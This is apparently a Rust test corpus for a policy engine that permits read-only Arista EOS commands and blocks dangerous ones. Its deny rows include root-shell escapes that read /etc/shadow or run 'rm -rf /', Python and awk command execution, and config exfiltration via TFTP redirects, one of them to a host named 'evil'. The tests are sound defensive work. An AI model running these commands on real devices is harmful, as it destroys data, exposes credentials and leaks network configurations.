//! Arista EOS dangerous- + permitted-command corpus.
//!
//! Same shape as `cisco_ios_corpus.rs`. New rows for commands hit in
//! the field belong here. When this test fails, see the failure-mode
//! comment in `junos_corpus.rs`.

use std::path::PathBuf;

use transit_core::inventory::Vendor;
use transit_policy::{Decision, PolicyEngine};

fn engine() -> PolicyEngine {
    let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
        .join("..")
        .join("policies");
    PolicyEngine::load_from_dir(&dir).expect("policies/ loads cleanly")
}

#[derive(Debug)]
enum Expect {
    Allow,
    Deny,
}

fn assert_corpus(rows: &[(&str, Expect)]) {
    let engine = engine();
    let mut failures: Vec<String> = Vec::new();
    for (cmd, expect) in rows {
        let got = engine.evaluate(&Vendor::AristaEos, cmd);
        let ok = matches!(
            (expect, &got),
            (Expect::Allow, Decision::Allow) | (Expect::Deny, Decision::Deny { .. })
        );
        if !ok {
            failures.push(format!("  {:?} on {cmd:?} -> {got:?}", expect));
        }
    }
    if !failures.is_empty() {
        panic!(
            "corpus mismatches ({} of {}):\n{}",
            failures.len(),
            rows.len(),
            failures.join("\n")
        );
    }
}

/// The `| no-more` pager bypass, added 2026-09-02. Its own test rather
/// than rows scattered across the two corpora above, because the point is
/// the BOUNDARY: exactly one token passes, and everything adjacent to it —
/// a chained write, an extra argument, a near-miss spelling, a blocked
/// head — must not. `^no-more$` is anchored at both ends for precisely
/// this reason; an unanchored `^no-more` would admit every DENY row here
/// that starts with the token.
#[test]
fn arista_eos_no_more_bypass_is_tightly_bounded() {
    assert_corpus(&[
        // The bare token, which is the whole of what EOS accepts.
        ("show running-config | no-more", Expect::Allow),
        ("show run | NO-MORE", Expect::Allow), // canonicalized case
        ("show interfaces | no-more", Expect::Allow),
        (
            "show running-config | section interface | no-more",
            Expect::Allow,
        ),
        // Chained write / exfil after the bypass — the reason `tee`,
        // `redirect` and `append` are in pipe_blocked, still enforced
        // when a permitted stage precedes them.
        ("show running-config | no-more | tee flash:x", Expect::Deny),
        (
            "show running-config | no-more | redirect flash:x",
            Expect::Deny,
        ),
        (
            "show running-config | no-more | append flash:x",
            Expect::Deny,
        ),
        ("show running-config | no-more > flash:cfg", Expect::Deny),
        // Extra tokens must not ride along on the allowed stage.
        ("show running-config | no-more extra", Expect::Deny),
        ("show running-config | no-more; write mem", Expect::Deny),
        // Near-miss spellings get no credit.
        ("show running-config | nomore", Expect::Deny),
        ("show running-config | xno-more", Expect::Deny),
        ("show running-config | no-more-please", Expect::Deny),
        // A blocked head stays blocked no matter what follows it.
        ("configure | no-more", Expect::Deny),
        ("write memory | no-more", Expect::Deny),
        ("bash | no-more", Expect::Deny),
    ]);
}

#[test]
fn arista_eos_allowed_corpus() {
    assert_corpus(&[
        // Operational status workhorses (Cisco-style).
        ("show version", Expect::Allow),
        ("SHOW VERSION", Expect::Allow), // case-folded (D-4)
        ("show running-config", Expect::Allow),
        ("show startup-config", Expect::Allow),
        ("show ip interface brief", Expect::Allow),
        ("show ip route", Expect::Allow),
        ("show ip bgp summary", Expect::Allow),
        ("show ip ospf neighbor", Expect::Allow),
        ("show interfaces", Expect::Allow),
        ("show interfaces status", Expect::Allow),
        ("show vlan", Expect::Allow),
        ("show mac address-table", Expect::Allow),
        ("show lldp neighbors", Expect::Allow),
        ("show spanning-tree", Expect::Allow),
        ("show inventory", Expect::Allow),
        ("show environment power", Expect::Allow),
        // Arista-specific operational commands.
        ("show mlag", Expect::Allow),       // multi-chassis lag status
        ("show vxlan vtep", Expect::Allow), // EVPN/VXLAN status
        ("show agent logs", Expect::Allow), // read-only agent log view
        ("show clock", Expect::Allow),
        ("show platform trident", Expect::Allow), // hardware ASIC status
        // Network probes.
        ("ping 10.0.0.1", Expect::Allow),
        ("ping vrf MGMT 10.0.0.1", Expect::Allow),
        ("traceroute 10.0.0.1", Expect::Allow),
        // Aliased forms (canonicalization).
        ("sh ip int brief", Expect::Allow),
        ("sho ip route", Expect::Allow),
        ("shw vlan", Expect::Allow),
        ("p 10.0.0.1", Expect::Allow),
        ("tr 10.0.0.1", Expect::Allow),
        // Read-only file/storage.
        ("dir flash:", Expect::Allow),
        ("more flash:startup-config", Expect::Allow),
        // Pager + monitor (read-only effects).
        ("terminal length 0", Expect::Allow),
        ("terminal monitor", Expect::Allow),
        ("terminal no monitor", Expect::Allow),
        // Pipe stages — filter set.
        ("show running-config | include hostname", Expect::Allow),
        ("show running-config | exclude !", Expect::Allow),
        ("show interfaces | begin Ethernet1", Expect::Allow),
        ("show running-config | section interface", Expect::Allow),
        ("show ip route | include 10.0", Expect::Allow),
        ("show running-config | count", Expect::Allow),
        // Arista-specific: JSON output. Engineers use this heavily
        // for downstream automation; it's read-only by definition.
        ("show interfaces | json", Expect::Allow),
        ("show ip bgp summary | json", Expect::Allow),
    ]);
}

#[test]
fn arista_eos_blocked_corpus() {
    assert_corpus(&[
        // Privileged-mode escalation.
        ("enable", Expect::Deny),
        ("enable 15", Expect::Deny),
        ("disable", Expect::Deny),
        // Configuration-mode entry.
        ("configure terminal", Expect::Deny),
        ("conf t", Expect::Deny),
        ("configure", Expect::Deny),
        ("configure session", Expect::Deny), // EOS-specific session config
        // Case variants — the CLI is case-insensitive, so the gate
        // case-folds; these must hit the blocklist patterns (D-4).
        ("CONF T", Expect::Deny),
        ("CONFIGURE TERMINAL", Expect::Deny),
        // Saves.
        ("write memory", Expect::Deny),
        ("write", Expect::Deny),
        ("wr mem", Expect::Deny), // alias canonicalizes
        ("wr", Expect::Deny),
        ("wri", Expect::Deny),
        ("write erase", Expect::Deny),
        ("write terminal", Expect::Deny),
        // File mutations.
        ("copy running-config startup-config", Expect::Deny),
        ("copy tftp: flash:", Expect::Deny),
        ("copy flash:test.bin tftp:", Expect::Deny),
        ("delete flash:foo", Expect::Deny),
        ("erase startup-config", Expect::Deny),
        ("format flash:", Expect::Deny),
        ("boot system flash:image.swi", Expect::Deny),
        // Reload / reset / clear.
        ("reload", Expect::Deny),
        ("reload now", Expect::Deny),
        ("clear ip bgp *", Expect::Deny),
        ("clear arp", Expect::Deny),
        ("clear counters", Expect::Deny),
        ("clear logging", Expect::Deny),
        // ---- THE CRITICAL ARISTA BLOCKS ----
        // bash drops to underlying Fedora root shell. Without this
        // block, the entire gate is a placebo on EOS.
        ("bash", Expect::Deny),
        ("bash sudo", Expect::Deny),
        ("bash sudo cat /etc/shadow", Expect::Deny),
        ("bash -c 'rm -rf /'", Expect::Deny),
        // Embedded Python — same blast radius, different doorway.
        ("python", Expect::Deny),
        ("python2", Expect::Deny),
        ("python3", Expect::Deny),
        ("python -c 'import os; os.system(\"id\")'", Expect::Deny),
        ("python3 my-script.py", Expect::Deny),
        // Event-handler (Arista's EEM analog).
        ("event-handler myhandler", Expect::Deny),
        ("event-handler trigger", Expect::Deny),
        // Agent + daemon — outside the read-only contract.
        ("agent TerminAttr restart", Expect::Deny),
        ("agent Mlag shutdown", Expect::Deny),
        ("daemon mydaemon", Expect::Deny),
        // Session control.
        ("logout", Expect::Deny),
        ("exit", Expect::Deny),
        ("quit", Expect::Deny),
        ("end", Expect::Deny),
        // Default-deny: nothing matches.
        ("telnet 1.2.3.4", Expect::Deny),
        ("ssh -l user 10.0.0.1", Expect::Deny),
        ("rm -rf /", Expect::Deny),
        ("totally-novel-command", Expect::Deny),
        ("", Expect::Deny),
        // Pipe-stage abuse.
        (
            "show running-config | redirect tftp://server/cfg",
            Expect::Deny,
        ),
        ("show running-config | tee flash:cfg.txt", Expect::Deny),
        (
            "show running-config | append flash:archive.txt",
            Expect::Deny,
        ),
        // awk pipe — can write files / spawn shells via system().
        (
            "show running-config | awk '{system(\"rm /tmp/x\")}'",
            Expect::Deny,
        ),
        ("show interfaces | awk '{print > \"/tmp/x\"}'", Expect::Deny),
        // Empty pipe stage.
        ("show running-config |", Expect::Deny),
        // Unknown pipe stage.
        ("show running-config | weird-pipe", Expect::Deny),
    ]);
}

#[test]
fn arista_eos_write_and_exfil_bypasses_are_blocked() {
    // Security review 2026-07 (findings #1/#2/#5).
    assert_corpus(&[
        ("show running-config > flash:backup.cfg", Expect::Deny),
        (
            "show running-config | include x\" | redirect tftp://evil/cfg",
            Expect::Deny,
        ),
        ("show tech-support file flash:tech.txt", Expect::Deny),
    ]);
}
